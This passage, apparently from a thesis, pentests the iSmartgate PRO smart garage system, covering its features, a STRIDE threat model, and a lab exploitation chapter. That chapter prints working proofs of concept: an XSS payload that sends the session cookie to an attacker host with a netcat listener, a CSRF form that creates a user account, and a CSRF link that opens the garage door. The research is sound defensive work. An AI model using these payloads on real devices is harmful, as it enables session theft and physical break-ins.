namic DNS (DDNS).

Early delimitation

Since neither integration to smart homes nor the DDNS are enabled by default,
they were not included in the scope of the study. The Windows application was
also excluded, because of time limitations. The two iOS apps were excluded
due to lack of iOS equipment.

3.2 Functionality

The main functionalities are managed from the admin panel of the controller
(see ﬁgure 3.2). The admin panel can be accessed from either the web interface
(local/remote) or the mobile app. The administrator of the smart garage has
the following abilities:

1. Operate garage doors or gates from distance

2. Add/Delete/Edit user accounts (10 for free)

CHAPTER 3. SYSTEM UNDER CONSIDERATION: ISMARTGATE PRO
21

Figure 3.2: The initial page after logging in to the web application of the con-
troller

3. Activate the system’s video plugin to watch real time video stream

4. Receive smartphone and/or email alerts when the door is open, closed

or left open

5. Edit network settings

6. Edit door/gate settings

7. Access a built-in calendar of events

8. Fully automate the garage or gate with IFTTT (schedule opening/closing
times, automatically open/close garage or gate with GPS, open/close
garage or gate with voice control with Amazon Echo)

The camera has its own settings, and they can be managed from the web in-
terface or the mobile app belonging to the camera (see ﬁgure 3.3). A owner
without a video plugin from the vendor may view the live feed of the video
camera directly from the web interface or the mobile app.

User privileges

The controller has one administrator. The other users can only operate the
door/gate and watch the live view video stream, if it is enabled. The adminis-
trator may limit the access time for the users, for example by allowing a user

CHAPTER 3. SYSTEM UNDER CONSIDERATION: ISMARTGATE

22
PRO

Figure 3.3: The web interface of the camera

to only access the application during Mondays between 1 pm and 2 pm.

The admin has the ability to upload images to replace the default images,
sounds to be played when the door/gate is operated, a user database and new
ﬁrmware to the controller.

Two separate user accounts have to be made for the camera. One account to
log in to the camera mobile app, where the installation of the camera is made.
Then a second account for the camera, since you can have multiple cameras
attached to the mobile app. It is this second account that is used to connect the
camera with the controller.

3.3 Technology

The smart garage has multiple user applications to manage the settings and to
check the status. To access the admin panel of the controller there is a web
server which can be accessed on the local network, a remote relay server that
connects to the local web server and a mobile application. The admin panel
of the camera can be accessed through a web server on the local network or
through a mobile application. Note here that it is possible to activate a camera
plugin to allow access to the camera from the controller’s admin panel. If the
plugin is not activated, the two components are separated.

CHAPTER 3. SYSTEM UNDER CONSIDERATION: ISMARTGATE PRO
23

The tilt sensor communicates directly to the controller. The communication is
over the radio frequency 2.401 GHz, but it is not Bluetooth. The tilt sensor has
an accelerometer to detect open/close position and a thermometer to measure
the temperature.

The communication protocol Bluetooth was discovered during the informa-
tion gathering phase. By searching for the FCC ID the controller is assigned
in the fccid.io database 1, the device has been approved for wireless commu-
nication through Bluetooth. It is not being used in the smart garage system.

The web server for the controller was built with nginx version 1.8.1 using
PHP version 5.6.18. The web server for the camera was using lighttpd version
1.4.35.

1https://fccid.io/VPYLB1DX | Published unknown, visited 2020-03-01

Chapter 4

Threat Model & Vulnerability Anal-
ysis

The method used for the threat modeling is described in section 2.4. Here
follows the threat model for the IoT system under consideration.

4.1 Identiﬁed Assets

In order to know which assets to protect, a table was created to enumerate
them. The assets that were identiﬁed are listed in table 4.1.

Assets

ID Description
01 Credentials to the controller
02 Credentials to the camera
03 Video stream
04 Microphone stream
05
06 Garage door status

Speaker functionality

ID Description
07 Event logs
08 Certiﬁcates and encryption keys
09 Things stored in the garage
10
11 Things stored in the house

Source code

Table 4.1: The identiﬁed assets for the IoT system

4.2 Architecture Overview

The architecture overview consists of three parts: use cases, data ﬂow diagram
of components and technologies.

24

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

25

4.2.1 Use cases

For creating the data ﬂow diagram of the components, use cases were written
down. The use cases represent the diﬀerent ways a user can access the admin
panel of either the controller or the camera. Keep in mind that the tilt sensor
does not have its own admin panel, thus it is not being mentioned for having
an admin panel.

Why only look at the functionality of accessing the admin panel? It is because
all functionalities, e.g. adding a new user or lowering the garage door, were
found to be managed from the two admin panels (belonging to the controller
and the camera). The change of the settings or commands sent to the devices
are locally stored or being transferred using the same protocol as the rest of
the options in the same admin panel. Multiple functions were not needed to
draw the data ﬂow diagram of the components.

The functionalities and features discovered are described in chapter 3.

A total of 16 use cases were identiﬁed. They are found in table 4.2.

4.2.2 Data Flow Diagram of Components

A data ﬂow diagram was drawn to visualize the components interacting in the
IoT system. The selected components are the ones that by default are able
to interact with the smart garage. It turned out that the default components
include the use cases 1 to 7. They are displayed in ﬁgure 4.1.

4.2.3 Technologies

The technologies used in the IoT system are summarized in table 4.3.

4.3 Decomposed IoT System

The data ﬂow for all possible use cases were documented and the possible
entry points were written down in three tables. One table for each physical
component of the IoT system.

26

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

Use Cases

ID Description
01 User views admin panel of the controller from the local network via the mobile application
02 User views admin panel of the controller from the local network via the web application
03 User views admin panel of the controller remotely via the mobile application
04 User views admin panel of the controller remotely via the web application
05 User views camera feed from the local network via the web application
06 User views camera feed from the local network via the mobile application
07 User views camera feed remotely via the mobile application
08 User views camera feed from the local network via the VMS
09 User views camera feed remotely via the VMS
10 User views camera feed remotely via DDNS
11 User views admin panel of the controller from the WLAN of the controller via the mobile application
12 User views admin panel of the controller from the WLAN of the controller via the web application
13 User views camera feed from the local network via the web application of the controller after the plugin

is activated

14 User views camera feed from the local network via the mobile application of the controller after the

plugin is activated

15 User views camera feed remotely via the web application of the controller after the plugin is activated
16 User views camera feed remotely via the mobile application of the controller after the plugin is acti-

vated

Table 4.2: The use cases identiﬁed as legit ways for a user to access the two
admin panels

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

27

Figure 4.1: A data ﬂow diagram representing use cases 1, 2, 3, 4, 5, 6 and 7

28

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

Technology
Controller

Camera

Tilt sensor

Wireless router
Mobile
(controller)

apps

apps

Mobile
(camera)
Communication
protocol: HTTP

Communication
protocol: HTTPS

Communication
protocol: 802.11
Communication
protocol: RF
Communication
protocol: SSH

Communication
protocol: STUN

Communication
protocol: UDP

Technologies

Description
OS unknown, communicates over HTTP, TCP/IP, UDP, web
server nginx 1.8.1, internal storage option
OS unknown, communicates over HTTPS, UDP, TCP, web
server lighttpd
OS unknown, communicates over the radio frequency 2.401
GHz, it is only compatible with this speciﬁc controller
2.5 GHz Wi-Fi
Android and iOS applications connected to a third party
cloud (Linode) to view the admin panel. If the mobile is
connected to the same WLAN as the controller, it commu-
nicates directly to the controller, without a remote server.
Android and iOS applications connected to a third party
cloud (Leaseweb, AWS) to view the camera feed.
Clear text protocol used by default when viewing admin
panel of the controller on the same network, or remotely
from a web browser. To view the admin panel of the camera
from the same network HTTP is used.
Encrypted communication when viewing the controller’s
admin panel remotely from the mobile app or chosen in the
web browser. It is used in all communication with the admin
panel of the camera, with one exception.
RF protocol for communication between camera, controller
and router
RF protocol for communication between controller and Tilt
sensor, 2.401 GHz
A cryptographic network protocol for providing a secure
channel over an unsecured network in a client-server archi-
tecture. An SSH-client application is connected with an
SSH server. A port is open on the controller
Network protocol to detect and traverse NAT (network ad-
dress translators) that are located in the path between 2 en-
points.
Fire and forget. Sends datagrams over IP.

Table 4.3: The identiﬁed technologies used in the IoT system

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

29

4.3.1 Entry Points

The entry points have an ID and a description. The entry points for the con-
troller can be found in table 4.4, for the camera in table 4.5 and for the tilt
sensor in table 4.6.

ID Entry point
01 Embedded

web app

02 Vendor web

app

03 Controller

04 Firmware
05 Mobile app

06 Wireless com-
munication

07 USB

Entry Points of Controller

Description
The embedded web application provides an interface to view the status
of the garage door and make changes to the user accounts, operating the
door, conﬁguration, and networking details. The data is transferred over
HTTP.
A connection is made from the controller to a relay server owned by the
vendor, set up in a cloud. Communication can be done either via HTTP
or HTTPS. No ports need to be opened on a router.
The controller connects to multiple web apps and mobile apps. An em-
bedded web app ia a server from the controller itself and the vendor web
app connects to the controller. There is a USB port and other inputs
through its main PCB. According to its FCC speciﬁcation it has Blue-
tooth.
The ﬁrmware is used to control the device.
Two mobile applications exist, Android and iOS. They can be used to
conﬁgure the controller. Credentials are required to use the mobile apps.
All traﬃc is over HTTPS. If the phone is connected to the same network
as the controller it communicates directly to the controller, otherwise
through the vendor web application.
Communication traﬃc from the mobile application are over wireless
technology; either 802.11 or cell provider networks. The tilt sensor uses
2.401 GHz.
There is a USB port on the physical device.

Table 4.4: Entry points for the controller

4.3.2 Data Flow Diagram

The visualization of the data ﬂow was divided into two categories to help un-
derstand the IoT system better.

1. Data ﬂow diagram showing components and protocols,

30

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

Entry Points of Camera

ID Entry point
08 Camera

09 VMS

10 DDNS

11 Mobile app

12 Embedded

web app

Description
The camera connects to multiple web apps and mobile apps. An embed-
ded web app is a server from the camera itself. The vendor has a mobile
app, but there is also another thrid-party mobile app from the original
manufacturer for the camera.
Software provided by the vendor of the controller, used to troubleshoot
connections for the camera. The computer with the software needs to
be on the same network as the camera. It is used to connect the camera
to a Wi-Fi. If peer2peer is enabled the computer can reach the camera
remotely.
In the settings of the camera you can add a dynamic DNS to the camera,
so that it can be accessible remotely.
Four mobile applications exist. Two from the vendor for Android and
iOS, and two from the thrid-party manufacturer of the camera for both
Android and iOS. All traﬃc is over HTTPS and the communication goes
through a relay server owned by the third-party.
The embedded web application is only availble if connected to the same
LAN. The traﬃc is over HTTP, even tho there is a port open for HTTPS
the user can’t log in using HTTPS. The app requires Adobe Flash Player
to be activated for the log in process and it requires certain plugins to be
installed. Here the live view can be seen and conﬁgurations be made.
For example a user can enable FTP or DDNS.
The ﬁrmware is used to control the device.

13 Firmware
14 Micro SD card The user can add a micro SD card to store the videos locally.
15 Ethernet port
16 Wireless com-
munication

There is a Ethernet port on the physical device.
Communication traﬃc from the mobile application are over wireless
technology; either 802.11 or cell provider networks.

Table 4.5: Entry points for the camera

Entry Points of Tilt Sensor

ID Entry point
17 Tilt sensor

18 Firmware

Description
The tilt sensor uses RF 2.401 GHz to communicate with the controller.
It has some interesting pins on its PCB.
The ﬁrmware controls the device. It sends the signals to the controller
of the status of the garage door and the temperature.

Table 4.6: Entry points for the tilt sensor

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

31

Figure 4.2: Data ﬂow diagram of use cases 1, 2, 3 and 4

2. Data ﬂow diagram showing components, protocols and entry points.

The ﬁrst category was made for all use cases. The tool used was diagrams.net.
They can be found in appendix A.

The second category with marked entry points was made for use cases 1 to
9. The tool used was Microsoft Threat Modeling Tool. The reason for exclud-
ing 10 to 16 was that they needed changes in the settings of either the controller
or the camera. Meanwhile the ﬁrst nine use cases are either enabled by default
or (applies to use case 8 and 9) that a software provided by the vendor can be
used to access the live view of the camera.

Use cases 1 to 4 are represented in ﬁgure 4.2. Use cases 5 to 7 are represented
in ﬁgure 4.3. Use cases 8 and 9 are represented in ﬁgure 4.4.

4.4 Identiﬁed Threats

The threats were discovered by using the Cyber Bogies card deck, the STRIDE
model with two additional threat types and the OWASP Top Ten. First, the

32

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

Figure 4.3: Data ﬂow diagram of use cases 5, 6 and 7

Figure 4.4: Data ﬂow diagram of use cases 8 and 9

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

33

threat actors where identiﬁed through the Cyber Bogies, then the threats were
written down using the template of STRIDE. Lastly, more detailed threats for
the web applications were located by using the OWASP Top Ten.

4.4.1 Threat Actors

A total of 17 threat actors were identiﬁed ny using the Cyber Bogies card deck.
The threat actors can be found in appendix B.

4.4.2 STRIDE Threats

The threats identiﬁed with the STRIDE model are presented in table 4.7. To
identify them according to the STRIDE model, a set of STRIDE oriented ques-
tions were asked. The questions come from chapter two in the IoT Penetration
Testing Cookbook [10].

Threat
type
Spooﬁng of
identity

Threats

Threats

• Spoof the tilt sensor
• Spoof a human user using a web application
• Spoof a human user using a mobile application
• Spoof a relay server
• Spoof the camera to show a false video
• Spoof a legit user via bluetooth to the controller
• Spoof a legit user via SSH to the controller
• Set up a fake access point to connect cameras to

34

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

Threat
type
Tampering
with data

Repudiation

Information
disclosure

Continuation of Table 4.7

Threats

• Send fake door status to the controller
• Change the packets in transit
• Alter the settings to allow other ways to access the admin panel
• Change settings to turn oﬀ alarms
• Play audio through the speakers
• Command injection via bluetooth
• Delete logs of login/door status/alarms
• Delete playback video streams
• Delete playback sound streams
• Add users to share camera streams without authorization
• Add users to share door status without authorization
• Upload malicious ﬁles

• No logs for SSH?
• No logs for bluetooth?
• Turn oﬀ logging

• Intercept traﬃc of video stream being sent from the camera (to the browser/-

mobile application/relay server/VMS...)

• Intercept traﬃc of microphone stream being sent from the camera (to the

browser/mobile application/relay server/VMS...)

• Leak stored video on micro SD card
• Leak garage door status (can reveal info about if someone is home or not)
• Leak credentials

Threat
type
Denial
service

of

Elevation
of
leges

privi-

Physical
security
bypass

Supply
chain issue

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

35

Continuation of Table 4.7

Threats

• Bring down the WLAN of the controller (so it can’t communicate with the tilt

sensor)

• Crash the controller (so it can’t lower the garage port)
• Bring down the camera (so that no recordings are being made to use as evi-

dence)

• Loss of power to controller/camera (prevent that alarms will be sent to the user

and user is unaware of loss of power)
• Delay the alarm until after the burglary
• Lock out user via forgot password functionality
• (Bring down relay server so no alarms are being sent)

• Go from a low level user to a more privileged user
• Bypass Wi-Fi authorization to connect to the WLAN of the controller
• Brute force login to controller
• Brute force login to camera
• (From admin panel gain access to other customers’ devices)

• Connect via the Ethernet port to the camera to get admin access
• Connect via the USB port to the controller to get admin access
• Use the reset button on camera to take control over the system
• Delete content stored on the micro SD card

• Connect to the camera through third-party mobile application (from the cam-

era manufacturer)

End of Table

Table 4.7: Identiﬁed threats divided into the eight diﬀerent
threat types

36

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

4.5 Selected Threats

A handful of threats were selected iteratively by considering the impact, the
probability of success and the initial results from the vulnerability analysis.

The purpose of writing the threat list (see table 4.7 was to test them all. Due
to limitations of time and equipment, it wasn’t possible to explore all threats.
For example it would have been interesting to try to spoof the signal to open
the garage door from the tilt sensor. In order to gather information about the
signal being sent and to reproduce it, a radio receiver and transmitter is needed
for the frequency 2.401 GHz. Unfortunately no such equipment was available,
thus the threats regarding the tilt sensor were excluded.

The hardware threats could potentially have led to extraction of ﬁrmware and
access to cryptographic keys used for decryption. Both the tilt sensor and the
controller were easy to open up and gain access to the internal hardware com-
ponents. The camera would have required demolition of the plastic case. It
was decided to exclude the hardware threats from the scope due to time con-
straints and that there were other threats with higher probability of successful
exploitation. For an attacker to abuse potential hardware vulnerabilities, it
would require access to the victim’s smart garage, or a purchase of the same
smart garage to extract information from before targeting a victim.

The threats involving the remote relay server were excluded due to legal rea-
sons. The remote entry point is not owned by the smart garage owner. Only
the traﬃc going out from the devices to the remote server were listen to, not
altered.

The threats regarding the USB port on the controller and the Ethernet port
on the camera were excluded due to lack of equipment for analysing the ports.
The threats towards the micro SD card for the camera were excluded because
the test setup didn’t have access to a micro SD card.

The VMS for the camera is only supposed to be used in case of trouble with the
camera installation. Since it is not a software component that is needed for the
daily usage of the smart garage, it was excluded due to time constraints. The
same for the the DDNS. It is a feature that is not enabled by default, therefore
it wasn’t included.

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

37

The ﬁndings from the Nessus scan pointed out usage of outdated components
in the controller’s web server. That is an indication that the security patches
were not up to date, and potential vulnerabilities could be found. The con-
troller and the camera were scanned by Nessus, but not the tilt sensor since it
does not communicate over Wi-Fi. No potential vulnerabilities were found re-
garding the network communication, other than the usage of HTTP. Thus, the
selected threats focused on the web interface of the controller, excluding the
mobile applications, the network threats and the web interface of the camera.

Next, the web vulnerability scanner from Burp Suite Professional was used
to scan the controller’s web interface. The potential vulnerabilities that the
scanner detected were translated into threats.

Finally, the threats to explore were the combination of the ﬁndings from the
Nessus scan, the web vulnerability scan from Burp Suite Professional and the
list of OWASP Top Ten. The entry point selected was the local web interface
of the controller.

The threats selected for investigation were:
From Nessus

1. Remote code execution -> tampering

2. Command injection -> tampering

From Burp

1. CSRF -> spooﬁng

2. Session hijacking -> spooﬁng

3. Malicious ﬁle upload -> tampering

4. Clickjacking -> spooﬁng

From OWASP Top Ten

1. Injection

2. Broken Authentication

3. Sensitive Data Exposure

4. XML External Entities (XXE)

38

CHAPTER 4. THREAT MODEL & VULNERABILITY ANALYSIS

5. Broken Access Control

6. Security Misconﬁguration

7. Cross-Site Scripting (XSS)

8. Insecure Deserialization

9. Using Components with Known Vulnerabilities

10. Insuﬃcient Logging & Monitoring

Chapter 5

Exploitation & Post Exploitation:
Method, Result & Discussion

The lab environment is described here, followed by all the tests that were made
for exploiting the potential vulnerabilities. Each exploitation task has a sec-
tion of useful background, method used, the result with potential PoCs, and a
discussion.

5.1 Lab Environment

The lab used for the penetration testing had two diﬀerent set ups. The main set
up used for all testing, except from where the testing method says otherwise,
had a connection to the Internet. The special case set up was only used during
the post exploitation.

1. Main setup

It was set up with a router connected to the Internet. Behind the router
was the controller and the camera, both connected to the Wi-Fi provided
by the router. The tilt sensor communicated directly to the controller,
without being connected to the router. This allowed usage of the remote
access feature of the controller.

2. Special case setup

In order to test if the attack would be successful for a remote attacker,
the lab was constructed to provide the Kali machine with a public IP
address. The tool ngrok 1 was used to set up a secure tunnel.

1https://ngrok.com/product | Published unknown, visited 2020-06-11

39

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

40
RESULT & DISCUSSION

Figure 5.1: Main setup for the lab environment

Figure 5.2: Special case setup of the lab environment

The main setup is displayed in ﬁgure 5.1 and the special case setup is shown
in ﬁgure 5.2.

In both setups, the tests were performed from the Kali Linux machine. Kali
is an operating system designed for penetration testing. A plethora of security
analysis tools are pre-installed to the operating system image.

5.2 Exploitation Task 1: XSS & Session Hi-

jacking

Cross-Site Scripting (XSS) is an attack vector that injects web scripts into the
client side of the web application.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
41

RESULT & DISCUSSION

5.2.1 Background

The Hyptertext Transfer Protocol (HTTP) is used in communication between
a client and a server. The protocol has multiple request methods. The two
most common request methods are GET and POST.

A GET request is used to retrieve data to the client. The parameters speci-
fying what data to request are placed in the URL. A POST request is used for
changing a state, for example when a user updates the email address used for
a social media account. The parameters are sent in the body of the request
instead of in the URL.

XSS attacks are introduced through HTTP requests. If the discovered XSS
vulnerability is found in a GET request, the attacker will craft a link with ma-
licious payload referring to the targeted domain. If the XSS vulnerability in-
stead is found in a POST request, the attacker has to create their own website
with an auto-submitting POST form containing the malicious payload, and
then craft a link referring to the malicious website.

The delivery of both the GET and POST XSS vulnerabilities can be made
through phishing. One goal of the delivery is that the victim clicks on the
link provided by the attacker while being authenticated at the targeted web-
site. XSS is dangerous even without the user being authenticated.

There exists three categories of XSS 2,3:

1. Reﬂected XSS

2. Stored XSS

3. DOM-based XSS

A reﬂected XSS is when the injected script is reﬂected directly in front of the
user from the current HTTP request. If a new request is made for the same
source, the XSS attack will not be present, because the payload only exists in
the HTTP request and it is not stored.

2https://portswigger.net/web-security/cross-site-scripting | Published unknown, visited

2020-05-21

3https://owasp.org/www-community/attacks/xss/ | Published unknown, visited 2020-05-

21

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

42
RESULT & DISCUSSION

A stored XSS has the script saved in a database, which can then be repro-
duced if the same or another user visits a page that retrieves the same data.
For example if a web forum is vulnerable to stored XSS, all users that visit the
forum will be targeted.

The third category is less common, and the vulnerability is located in client-
side code instead of in server-side code. DOM-based XSS usual has JavaScript
code in the client-side code that accepts input from a source that the attacker
could control. The input then gets passed on to a HTML or JavaScript sink.
The sink supports dynamic code execution, leading to the ability of executing
malicious scripts provided by an attacker. 4

Session hijacking is an attack used to exploit the web session control mecha-
nism 5. The web server must be able to keep track of diﬀerent users using the
application. To do that the web server uses a session token. In iSmartgate PRO
the session token is a cookie being sent in the HTTP header of the requests.
The cookie is connected to the active session, helping the web server to know
which user is sending which requests. If an attacker get hold of the session
token, it can then be used for sending request on the behalf of the legitimate
user.

5.2.2 Method

The test was divided into two parts. First a XSS vulnerability had to be iden-
tiﬁed, second an attempt to steal the session was made.

XSS

The test was done by manually looking for actions that generated GET and
POST requests. Once the requests were enumerated a test string was sent as
input. The test string contained script tags and the JavaScript function alert. If
the payload worked, an alert box should show up in the web browser displaying
the value 1.

<script>alert(1);</script>

4https://portswigger.net/web-security/cross-site-scripting/dom-based | Published un-

known, visited 2020-05-21

5https://owasp.org/www-community/attacks/Session_hijacking_attack | Published un-

known, visited 2020-05-30

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
43

RESULT & DISCUSSION

To fully investigate if the request was vulnerable to XSS, the developer tool in
the browser was used. In Mozilla Firefox it is called Inspect Element. With
the tool it is possible to see where in the code the payload is placed, and if it
gets encoded. That is useful information for being able to bypass implemented
protection, since using script tags can easily be detected.

Session hijacking

After the value got alerted, the next step was to create a Proof of Concept
(PoC), demonstrating a real attack scenario. The chosen attack scenario was
session hijacking, where the session cookie was stolen from the victim and
used by the attacker. To access the cookie, there is a JavaScript document
property that is used for reading and writing cookies 6. It is called cookie:

document.cookie

5.2.3 Result

One reﬂected XSS vulnerability was found, and with it a successful session
hijacking was made.

Finding 1

It was possible to exploit a XSS vulnerability in the POST form used to search
for users, via /index.php. The exploited input ﬁeld busca was found in the
functionality for searching for users (see ﬁgure 5.3).

Figure 5.3: A successful XSS of the input ﬁeld busca

6https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie | Published 2020-

05-28, visited 2020-05-30

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

44
RESULT & DISCUSSION

The session cookie was unprotected, thus document.cookie could be used to
access it. The PoC created for the session hijacking, utilizing the XSS vulner-
ability, can be found in listing 5.1.

1 < form name = " T h e F o r m " a c t i o n = " http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / index . php ? op =

2

3

4

5

6

7

c o n f i g & opc = users # search - list " m e t h o d = " post " >
< input type = " h i d d e n " name = " op " value = " c o n f i g " >
< input type = " h i d d e n " name = " opc " value = " users " >
< input type = " h i d d e n " name = " o p _ u s e r " value = " buscar - users " >
< input type = " s u b m i t " name = " s e a r c h _ u s e r " class = " search - btn
hide " value = " " >
<! -- The m a l i c i o u s p a y l o a d -- >
< input type = " h i d d e n " name = " busca " value = " &#34; a u t o f o c u s
o n f o c u s = & # 3 4 ; new Image () . src = ' http : / / 1 9 2 . 1 6 8 . 1 . 1 0 4 : 1 3 3 7 / ?
o u t p u t = '+ d o c u m e n t . c o o k i e &#34; dummy = & # 3 4 ; " >

8 </ form >
9
10 < s c r i p t >
11
12 </ s c r i p t >
13

d o c u m e n t . T h e F o r m . s u b m i t () ;

Listing 5.1: PoC for session hijacking

In this PoC the IP address 192.168.1.100 is the targeted website, and 192.168.1.104
is the website controlled by the attacker. The port 1337 will be used to connect
to the attacker’s website, and the session cookie will be sent there.

In order for the attacker to receive the session cookie, the attacker needs to
listen on the port speciﬁed in the payload. It can be done by using netcat.

$ nc -lvp 1337

5.2.4 Discussion

This attack requires user interaction, it has to be the admin of the IoT system
that clicks the malicious link and the victim has to be signed in. If the victim
isn’t signed in, the session cookie stored in the victim’s browser can’t be used
for authenticating the POST request.

This XSS attack could be delivered because there is no protection against
Cross-Site Request Forgery (CSRF). If the request used in the XSS attack was
a GET request, the protections against CSRF would not have prevented the
attack.

To protect against reﬂected and stored XSS, untrusted HTTP request data
should be escaped. For DOM based XSS, using context-sensitive encoding

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
45

RESULT & DISCUSSION

when modifying the browser document on the client side is a method of pre-
vention.

The session hijacking works because the session cookie lacks protection. A
protection that could be enabled is the cookie attribute HttpOnly. Once it is
enabled it will block attempts to access the cookie values through JavaScript.

In this case the goal was to get hold of the session cookie of the victim. The
cookie is set to be valid for 72-94 hours, which gives the attacker a larger time
scope to get hold of the cookie and to utilize it.

5.3 Exploitation Task 2: CSRF

Cross-Site Request Forgery (CSRF) is an attack vector that makes a user per-
form an action without intention.

5.3.1 Background

The root cause for CSRF vulnerabilities is that the legitimate website’s request
and the malicious website’s request are exactly the same. The web server can’t
distinguish between them, and will allow both requests. To solve this problem,
there needs to be a prevention in place that makes it possible for the server to
tell the two requests apart [16].

A CSRF attack could be delivered to a victim through an email containing the
malicious link [17]. The link will either point directly to a webpage with a GET
request, or to a website controlled by the attacker. The website controlled by
the attacker has a replica of a legitimate POST request from the original web-
site, but the values of the input ﬁelds contain the malicious payload. When the
attacker controlled website gets visited by the victim, the POST form will be
automatically submitted to the server of the targeted website.

5.3.2 Method

First, all state changing requests in the web application were identiﬁed. Then
the requests were tested for CSRF by either:

• manually create a web page with a POST request form,

• using the existing URL for a GET request,

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

46
RESULT & DISCUSSION

• using Burp Suite Professional’s automation tool for generating CSRF

POST request form.

The crafted requests were provided with an URL, and tested by having an
authenticated user clicking on them. The change of state was observed. If the
intended change was made it was a successful test, if no change happened it
was a failed test.

5.3.3 Result

The website was vulnerable to CSRF, for both GET requests and POST re-
quests.

Finding 1

It was possible to create a new user account by exploiting the CSRF vulner-
ability, via /index.php. The attacker could specify the credentials for the new
account, and thus login as the new user and have access to open/close the
garage and view the live stream video. The PoC for the vulnerability can be
seen in listing 5.2.

1 < form name = " T h e F o r m "

a c t i o n = " http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / index . php "

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

m e t h o d = " POST " >
< input type = " h i d d e n " name = " login " value = " user " / >
< input type = " h i d d e n " name = " p a s s w o r d " value = " user " / >
< input type = " h i d d e n " name = " p a s s w o r d 2 " value = " user " / >
< input type = " h i d d e n " name = " user &#95; name " value = " user " / >
< input type = " h i d d e n " name = " email " value = " user &#64; user &#46;
com " / >
< input type = " h i d d e n " name = " sel &#95; l a n g u a g e " value = " en " / >
< input type = " h i d d e n " name = " pin " value = " 1337 " / >
< input type = " h i d d e n " name = " c o m m e n t " value = " test " / >
< input type = " h i d d e n " name = " num &#95; doors " value = " 1 " / >
< input type = " h i d d e n " name = " door1 " value = " 1 " / >
< input type = " h i d d e n " name = " c a m e r a &#95; a c c e s s " value = " 0 " / >
< input type = " h i d d e n " name = " r e m o t e &#95; c o n n e c t i o n " value = " 1 "
/ >
< input type = " h i d d e n " name = " user &#95; a c c e s s " value = " 1 " / >
< input type = " h i d d e n " name = " event &#95; start &#95; date " value = "
1 6 & # 4 7 ; 0 4 & # 4 7 ; 2 0 2 0 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 9 9 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 0 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 1 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 2 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 3 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 4 " value = "
8 & # 3 5 ; 9 & # 3 5 ; 1 0 & # 3 5 ; 1 1 & # 3 5 ; 1 2 & # 3 5 ; 1 3 & # 3 5 ; 1 5 & # 3 5 ; 1 6 & # 3 5 ; 1 7 " / >

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
47

RESULT & DISCUSSION

22

23

24

25

26

27

< input type = " h i d d e n " name = " inp & # 4 5 ; 5 " value = " " / >
< input type = " h i d d e n " name = " inp & # 4 5 ; 6 " value = " " / >
< input type = " h i d d e n " name = " op " value = " c o n f i g " / >
< input type = " h i d d e n " name = " opc " value = " users " / >
< input type = " h i d d e n " name = " op &#95; user " value = " c r e a t e &#45;
user " / >
< input type = " h i d d e n " name = " user &#45; c r e a t e " value = " C r e a t e " /
>
< input type = " s u b m i t " value = " S u b m i t r e q u e s t " / >

28
29 </ form >
30 < s c r i p t >
31
32 </ s c r i p t >

d o c u m e n t . T h e F o r m . s u b m i t () ;

Listing 5.2: PoC for CSRF vulnerability allowing creation of new users

Finding 2

It was possible to provide the victim with a link to a GET request to open the
garage, via /isg/opendoor.php. The attacker could specify which door to open
or close. The PoC for the vulnerability can be seen in listing 5.3.

1 http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / isg / o p e n d o o r . php ? n u m d o o r =1& s t a t u s =0

Listing 5.3: PoC for CSRF vulnerability allowing opening of garage

Finding 3

It was possible to upload an image (PNG, JPG, JPEG) by exploiting the CSRF
vulnerability, via /index.php. The attacker could specify the image to be up-
loaded. The PoC was created by using Burp Suite Professional’s automation
tool, and can be found in appendix C in listing C.1.

Finding 4

